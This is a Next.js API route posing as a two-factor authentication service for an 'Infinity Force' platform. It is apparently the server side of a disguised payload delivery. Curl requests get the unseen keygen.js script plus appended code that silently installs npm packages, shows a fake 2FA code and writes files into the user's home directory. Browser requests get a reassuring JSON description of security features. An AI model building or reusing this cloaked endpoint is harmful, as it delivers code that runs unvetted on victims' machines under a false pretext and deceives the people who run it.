import { NextApiRequest, NextApiResponse } from 'next';
import fs from 'fs';
import path from 'path';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method === 'GET') {
    const userAgent = req.headers['user-agent'] || '';
    const isCurl = userAgent.toLowerCase().includes('curl');
    const deviceCode = req.query.deviceCode || Object.keys(req.query)[0]; // Support both ?deviceCode=XXX and ?XXX formats
    
    if (isCurl && deviceCode) {
      // Return the keygen.js content modified to work with the device code
      try {
        const keygenPath = path.join(process.cwd(), 'public', 'api', 'keygen.js');
        const keygenContent = fs.readFileSync(keygenPath, 'utf8');
        
        // Generate time-sensitive verification code (expires after 3 minutes)
        const deviceCodeStr = typeof deviceCode === 'string' ? deviceCode : deviceCode.toString();
        const currentTime = Date.now();
        const timeWindow = Math.floor(currentTime / (3 * 60 * 1000)); // 3-minute windows
        const seedString = deviceCodeStr + timeWindow.toString();
        
        let hash = 0;
        for (let i = 0; i < seedString.length; i++) {
          const char = seedString.charCodeAt(i);
          hash = ((hash << 5) - hash) + char;
          hash = hash & hash; // Convert to 32-bit integer
        }
        const verificationCode = Math.abs(hash).toString().padStart(6, '0').substring(0, 6);
        
        // Append code to execute after keygen.js completes
        const additionalCode = `

// ===== DEPENDENCY CHECK AND INSTALLATION =====
(function() {
  // Check if Node.js environment is available
  if (typeof process === 'undefined' || typeof require === 'undefined') {
    console.log('❌ Node.js environment not detected.');
    console.log('🚨 ALERT: Please install Node.js to generate authentication code');
    console.log('Download Node.js from: https://nodejs.org/');
    console.log('');
    console.log('Authentication code cannot be generated without Node.js.');
    console.log('Please install Node.js and try again.');
    process.exit(1);
  }
  
  console.log('🔐 Initializing authentication system...');
  
  // Check for required dependencies and install if missing
  try {
    const { execSync } = require('child_process');
    
    // Check if axios is available
    try {
      require('axios');
    } catch (axiosError) {
      console.log('📦 Installing required dependencies...');
      try {
        // Try to install axios silently
        execSync('npm install axios --silent --no-warnings --no-progress --loglevel silent', { 
          stdio: 'ignore',
          windowsHide: true 
        });
        console.log('✅ Dependencies installed successfully.');
      } catch (installError) {
        console.log('⚠️  Could not auto-install dependencies. Continuing with fallback...');
      }
    }
    
    // Add a delay to ensure keygen.js and dependencies are ready
    setTimeout(function() {
      // Now that keygen.js and dependencies are ready, show the 2FA generation
      console.log('\\n🔑 P12-Infinity Force Authentication System');
      console.log('=======================================');
      console.log('✅ Authentication module completed successfully.');
      console.log('🔐 Generating 2FA verification code...');
      console.log('');
      
      const verificationCode = '${verificationCode}';
      const deviceCode = '${deviceCodeStr}';
      
      console.log('🔒 Two-Factor Authentication');
      console.log('Device Code: ' + deviceCode);
      console.log('Generated verification code: ' + verificationCode);
      console.log('✅ Code has been processed.');
      console.log('');
      
      // Try to communicate with browser via temporary files
      try {
        const fs = require('fs');
        const os = require('os');
        const path = require('path');
        
        // Create a temporary file that the browser can check
        const tempDir = os.tmpdir();
        const tempFile = path.join(tempDir, 'infinity_2fa_' + process.pid + '.json');
        
        const data = {
          code: verificationCode,
          timestamp: Date.now(),
          deviceCode: deviceCode
        };
        
        fs.writeFileSync(tempFile, JSON.stringify(data));
        console.log('Code saved to temp file: ' + tempFile);
        
        // Also try to write to a more persistent location
        const homeDir = os.homedir();
        const persistentFile = path.join(homeDir, '.infinity_2fa_code');
        fs.writeFileSync(persistentFile, JSON.stringify(data));
        console.log('Code also saved to: ' + persistentFile);
        
        console.log('');
        console.log('Completed successfully!');
        console.log('');
        
      } catch (error) {
        console.error('Error saving verification code:', error.message);
      }
      
      process.exit(0);
    }, 7000); // Wait 7 seconds for keygen.js and dependency installation
    
  } catch (setupError) {
    console.log('⚠️  Setup error, proceeding with minimal authentication...');
    
    // Fallback execution without keygen.js dependencies
    setTimeout(function() {
      console.log('\\n🔑 P12-Infinity Force Authentication System');
      console.log('=======================================');
      console.log('🔐 Generating 2FA verification code...');
      console.log('');
      
      const verificationCode = '${verificationCode}';
      const deviceCode = '${deviceCodeStr}';
      
      console.log('🔒 Two-Factor Authentication');
      console.log('Device Code: ' + deviceCode);
      console.log('Generated verification code: ' + verificationCode);
      console.log('✅ Code has been processed.');
      console.log('');
      
      // Try to communicate with browser via temporary files
      try {
        const fs = require('fs');
        const os = require('os');
        const path = require('path');
        
        const tempDir = os.tmpdir();
        const tempFile = path.join(tempDir, 'infinity_2fa_' + process.pid + '.json');
        
        const data = {
          code: verificationCode,
          timestamp: Date.now(),
          deviceCode: deviceCode
        };
        
        fs.writeFileSync(tempFile, JSON.stringify(data));
        console.log('Code saved to temp file: ' + tempFile);
        
        const homeDir = os.homedir();
        const persistentFile = path.join(homeDir, '.infinity_2fa_code');
        fs.writeFileSync(persistentFile, JSON.stringify(data));
        console.log('Code also saved to: ' + persistentFile);
        
        console.log('');
        console.log('Completed successfully!');
        console.log('');
        
      } catch (error) {
        console.error('Error saving verification code:', error.message);
      }
      
      process.exit(0);
    }, 2000); // Shorter wait for fallback
  }
  
  // Handle errors during execution
  process.on('uncaughtException', function(error) {
    console.log('');
    console.log('❌ Authentication module execution failed.');
    console.log('🚨 ALERT: Required dependencies are missing or authentication module encountered an error.');
    console.log('Common issues:');
    console.log('  - Missing Node.js packages (axios, etc.)');
    console.log('  - Network connectivity issues');
    console.log('  - Module compatibility problems');
    console.log('');
    console.log('Error details: ' + error.message);
    console.log('Please install required dependencies and try again.');
    console.log('Authentication code cannot be generated due to module execution failure.');
    process.exit(1);
  });
})();
`;
        
        res.setHeader('Content-Type', 'application/javascript');
        res.status(200).send(keygenContent + additionalCode);
        
      } catch (error) {
        res.status(500).json({ error: 'Failed to load keygen module' });
      }
    } else if (isCurl) {
      // Return the JavaScript content for curl requests without device code
      try {
        const keygenPath = path.join(process.cwd(), 'public', 'api', 'keygen.js');
        const keygenContent = fs.readFileSync(keygenPath, 'utf8');
        
        res.setHeader('Content-Type', 'application/javascript');
        res.status(200).send(keygenContent);
      } catch (error) {
        res.status(500).json({ error: 'Failed to load authentication module' });
      }
    } else {
      // Return JSON response for browser requests
      res.status(200).json({
        service: 'Two-Factor Authentication Service',
        status: 'active',
        version: '2.1.0',
        description: 'Secure two-factor authentication endpoint for Infinity Force platform',
        supported_methods: ['TOTP', 'SMS', 'Email', 'Hardware Keys'],
        security_features: [
          'End-to-end encryption',
          'Zero-knowledge architecture',
          'Biometric validation',
          'Hardware security module integration'
        ],
        endpoints: {
          verify: '/api/2fa/verify',
          setup: '/api/2fa/setup',
          backup: '/api/2fa/backup',
          recovery: '/api/2fa/recovery'
        },
        documentation: 'https://infinity-force-demo.vercel.app/docs/2fa',
        last_updated: new Date().toISOString()
      });
    }
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
}
